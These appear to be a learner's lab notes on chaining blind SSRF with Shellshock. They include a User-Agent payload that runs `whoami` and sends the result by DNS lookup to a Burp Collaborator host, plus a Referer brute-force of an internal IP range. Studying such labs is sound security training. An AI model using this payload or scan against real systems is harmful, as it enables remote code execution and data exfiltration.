## LAB: Blind SSRF with Shellshock Exploitation

**Vulnerability:** Blind SSRF chained with Shellshock to achieve remote code execution on internal server

**Steps:**
- Install Collaborator Everywhere extension from BApp Store (Burp Pro)
- Add target domain to scope confirm HTTP interaction via Referer header
- Note User-Agent is reflected in the interaction
- Send product page to Intruder, generate Collaborator payload
- Inject Shellshock payload into User-Agent:
`() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
- Set Referer to `http://192.168.0.§1§:8080` and brute force last octet 1–255
- Poll Collaborator for DNS interaction subdomain will contain the OS username

**Key payloads/paths:**
- `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
- Referer: `http://192.168.0.[1-255]:8080`

**Note:** Requires Burp Pro. Shellshock is an older CVE this lab
demonstrates chaining concepts more than a common modern finding

**Remember for bug bounty:** Blind SSRF becomes high severity when you
can chain it with other vulnerabilities like Shellshock or reach cloud
metadata endpoints always try to escalate beyond just confirming
outbound requests exist
